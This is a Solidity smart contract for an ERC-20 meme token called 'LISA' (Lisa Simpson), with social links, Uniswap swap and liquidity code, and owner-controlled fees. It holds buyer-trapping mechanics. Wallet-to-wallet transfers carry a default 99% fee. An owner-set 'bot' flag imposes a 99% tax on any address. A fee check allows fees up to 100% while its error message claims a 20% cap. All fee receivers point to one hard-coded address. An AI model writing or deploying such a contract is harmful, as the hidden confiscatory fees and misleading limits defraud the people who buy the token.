1 /**
2 
3 $LISA- The #SIMPSON Daughter
4 
5 https://t.me/Lisa_SimpsonERC
6 
7 https://twitter.com/LisaSimpon_ERC
8 
9 */
10 
11 // SPDX-License-Identifier: MIT
12 
13 pragma solidity 0.8.16;
14 
15 
16 library SafeMath {
17     function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
18     function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
19     function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
20     function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
21     function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
22     
23     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
24         unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}
25 
26     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
27         unchecked {if(b > a) return(false, 0); return(true, a - b);}}
28 
29     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
30         unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
31         if(c / a != b) return(false, 0); return(true, c);}}
32 
33     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
34         unchecked {if(b == 0) return(false, 0); return(true, a / b);}}
35 
36     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
37         unchecked {if(b == 0) return(false, 0); return(true, a % b);}}
38 
39     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
40         unchecked{require(b <= a, errorMessage); return a - b;}}
41 
42     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
43         unchecked{require(b > 0, errorMessage); return a / b;}}
44 
45     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
46         unchecked{require(b > 0, errorMessage); return a % b;}}}
47 
48 interface IERC20 {
49     function totalSupply() external view returns (uint256);
50     function decimals() external view returns (uint8);
51     function symbol() external view returns (string memory);
52     function name() external view returns (string memory);
53     function getOwner() external view returns (address);
54     function balanceOf(address account) external view returns (uint256);
55     function transfer(address recipient, uint256 amount) external returns (bool);
56     function allowance(address _owner, address spender) external view returns (uint256);
57     function approve(address spender, uint256 amount) external returns (bool);
58     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
59     event Transfer(address indexed from, address indexed to, uint256 value);
60     event Approval(address indexed owner, address indexed spender, uint256 value);}
61 
62 abstract contract Ownable {
63     address internal owner;
64     constructor(address _owner) {owner = _owner;}
65     modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
66     function isOwner(address account) public view returns (bool) {return account == owner;}
67     function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
68     event OwnershipTransferred(address owner);
69 }
70 
71 interface IFactory{
72         function createPair(address tokenA, address tokenB) external returns (address pair);
73         function getPair(address tokenA, address tokenB) external view returns (address pair);
74 }
75 
76 interface IRouter {
77     function factory() external pure returns (address);
78     function WETH() external pure returns (address);
79     function addLiquidityETH(
80         address token,
81         uint amountTokenDesired,
82         uint amountTokenMin,
83         uint amountETHMin,
84         address to,
85         uint deadline
86     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
87 
88     function removeLiquidityWithPermit(
89         address tokenA,
90         address tokenB,
91         uint liquidity,
92         uint amountAMin,
93         uint amountBMin,
94         address to,
95         uint deadline,
96         bool approveMax, uint8 v, bytes32 r, bytes32 s
97     ) external returns (uint amountA, uint amountB);
98 
99     function swapExactETHForTokensSupportingFeeOnTransferTokens(
100         uint amountOutMin,
101         address[] calldata path,
102         address to,
103         uint deadline
104     ) external payable;
105 
106     function swapExactTokensForETHSupportingFeeOnTransferTokens(
107         uint amountIn,
108         uint amountOutMin,
109         address[] calldata path,
110         address to,
111         uint deadline) external;
112 }
113 
114 contract LISA is IERC20, Ownable {
115     using SafeMath for uint256;
116     string private constant _name = 'Lisa Simpson';
117     string private constant _symbol = 'LISA';
118     uint8 private constant _decimals = 9;
119     uint256 private _totalSupply = 420000000000000000 * (10 ** _decimals);
120     uint256 private _maxTxAmountPercent = 200; // 10000;
121     uint256 private _maxTransferPercent = 200;
122     uint256 private _maxWalletPercent = 300;
123     mapping (address => uint256) _balances;
124     mapping (address => mapping (address => uint256)) private _allowances;
125     mapping (address => bool) public isFeeExempt;
126     mapping (address => bool) private isBot;
127     IRouter router;
128     address public pair;
129     bool private tradingAllowed = false;
130     uint256 private liquidityFee = 0;
131     uint256 private marketingFee = 0;
132     uint256 private developmentFee = 1000;
133     uint256 private burnFee = 0;
134     uint256 private totalFee = 3000;
135     uint256 private sellFee = 5000;
136     uint256 private transferFee = 9900;
137     uint256 private denominator = 10000;
138     bool private swapEnabled = true;
139     uint256 private swapTimes;
140     bool private swapping;
141     uint256 swapAmount = 3;
142     uint256 private swapThreshold = ( _totalSupply * 1000 ) / 100000;
143     uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;
144     modifier lockTheSwap {swapping = true; _; swapping = false;}
145 
146     address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
147     address internal constant development_receiver = 0x636448B482991A8E212E1357b0E7180f8a46Cbc9; 
148     address internal constant marketing_receiver = 0x636448B482991A8E212E1357b0E7180f8a46Cbc9;
149     address internal constant liquidity_receiver = 0x636448B482991A8E212E1357b0E7180f8a46Cbc9;
150 
151     constructor() Ownable(msg.sender) {
152         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
153         address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
154         router = _router;
155         pair = _pair;
156         isFeeExempt[address(this)] = true;
157         isFeeExempt[liquidity_receiver] = true;
158         isFeeExempt[marketing_receiver] = true;
159         isFeeExempt[msg.sender] = true;
160         _balances[msg.sender] = _totalSupply;
161         emit Transfer(address(0), msg.sender, _totalSupply);
162     }
163 
164     receive() external payable {}
165     function name() public pure returns (string memory) {return _name;}
166     function symbol() public pure returns (string memory) {return _symbol;}
167     function decimals() public pure returns (uint8) {return _decimals;}
168     function startTrading() external onlyOwner {tradingAllowed = true;}
169     function getOwner() external view override returns (address) { return owner; }
170     function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
171     function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
172     function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
173     function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }
174     function setisBot(address _address, bool _enabled) external onlyOwner {isBot[_address] = _enabled;}
175     function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
176     function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
177     function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
178     function _maxWalletToken() public view returns (uint256) {return totalSupply() * _maxWalletPercent / denominator;}
179     function _maxTxAmount() public view returns (uint256) {return totalSupply() * _maxTxAmountPercent / denominator;}
180     function _maxTransferAmount() public view returns (uint256) {return totalSupply() * _maxTransferPercent / denominator;}
181 
182     function preTxCheck(address sender, address recipient, uint256 amount) internal view {
183         require(sender != address(0), "ERC20: transfer from the zero address");
184         require(recipient != address(0), "ERC20: transfer to the zero address");
185         require(amount > uint256(0), "Transfer amount must be greater than zero");
186         require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
187     }
188 
189     function _transfer(address sender, address recipient, uint256 amount) private {
190         preTxCheck(sender, recipient, amount);
191         checkTradingAllowed(sender, recipient);
192         checkMaxWallet(sender, recipient, amount); 
193         swapbackCounters(sender, recipient);
194         checkTxLimit(sender, recipient, amount); 
195         swapBack(sender, recipient, amount);
196         _balances[sender] = _balances[sender].sub(amount);
197         uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
198         _balances[recipient] = _balances[recipient].add(amountReceived);
199         emit Transfer(sender, recipient, amountReceived);
200     }
201 
202     function setStructure(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
203         liquidityFee = _liquidity;
204         marketingFee = _marketing;
205         burnFee = _burn;
206         developmentFee = _development;
207         totalFee = _total;
208         sellFee = _sell;
209         transferFee = _trans;
210         require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1), "totalFee and sellFee cannot be more than 20%");
211     }
212 
213     function setParameters(uint256 _buy, uint256 _trans, uint256 _wallet) external onlyOwner {
214         uint256 newTx = (totalSupply() * _buy) / 10000;
215         uint256 newTransfer = (totalSupply() * _trans) / 10000;
216         uint256 newWallet = (totalSupply() * _wallet) / 10000;
217         _maxTxAmountPercent = _buy;
218         _maxTransferPercent = _trans;
219         _maxWalletPercent = _wallet;
220         uint256 limit = totalSupply().mul(5).div(1000);
221         require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
222     }
223 
224     function checkTradingAllowed(address sender, address recipient) internal view {
225         if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "tradingAllowed");}
226     }
227     
228     function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
229         if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){
230             require((_balances[recipient].add(amount)) <= _maxWalletToken(), "Exceeds maximum wallet amount.");}
231     }
232 
233     function swapbackCounters(address sender, address recipient) internal {
234         if(recipient == pair && !isFeeExempt[sender]){swapTimes += uint256(1);}
235     }
236 
237     function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
238         if(sender != pair){require(amount <= _maxTransferAmount() || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");}
239         require(amount <= _maxTxAmount() || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");
240     }
241 
242     function swapAndLiquify(uint256 tokens) private lockTheSwap {
243         uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
244         uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
245         uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
246         uint256 initialBalance = address(this).balance;
247         swapTokensForETH(toSwap);
248         uint256 deltaBalance = address(this).balance.sub(initialBalance);
249         uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
250         uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
251         if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
252         uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
253         if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}
254         uint256 remainingBalance = address(this).balance;
255         if(remainingBalance > uint256(0)){payable(development_receiver).transfer(remainingBalance);}
256     }
257 
258     function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
259         _approve(address(this), address(router), tokenAmount);
260         router.addLiquidityETH{value: ETHAmount}(
261             address(this),
262             tokenAmount,
263             0,
264             0,
265             liquidity_receiver,
266             block.timestamp);
267     }
268 
269     function swapTokensForETH(uint256 tokenAmount) private {
270         address[] memory path = new address[](2);
271         path[0] = address(this);
272         path[1] = router.WETH();
273         _approve(address(this), address(router), tokenAmount);
274         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
275             tokenAmount,
276             0,
277             path,
278             address(this),
279             block.timestamp);
280     }
281 
282     function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
283         bool aboveMin = amount >= minTokenAmount;
284         bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
285         return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
286     }
287 
288     function setSwapbackSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
289         swapAmount = _swapAmount; swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000)); 
290         minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));
291     }
292 
293     function swapBack(address sender, address recipient, uint256 amount) internal {
294         if(shouldSwapBack(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
295     }
296 
297     function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
298         return !isFeeExempt[sender] && !isFeeExempt[recipient];
299     }
300 
301     function getTotalFee(address sender, address recipient) internal view returns (uint256) {
302         if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}
303         if(recipient == pair){return sellFee;}
304         if(sender == pair){return totalFee;}
305         return transferFee;
306     }
307 
308     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
309         if(getTotalFee(sender, recipient) > 0){
310         uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
311         _balances[address(this)] = _balances[address(this)].add(feeAmount);
312         emit Transfer(sender, address(this), feeAmount);
313         if(burnFee > uint256(0)){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
314         return amount.sub(feeAmount);} return amount;
315     }
316 
317     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
318         _transfer(sender, recipient, amount);
319         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
320         return true;
321     }
322 
323     function _approve(address owner, address spender, uint256 amount) private {
324         require(owner != address(0), "ERC20: approve from the zero address");
325         require(spender != address(0), "ERC20: approve to the zero address");
326         _allowances[owner][spender] = amount;
327         emit Approval(owner, spender, amount);
328     }
329 
330 }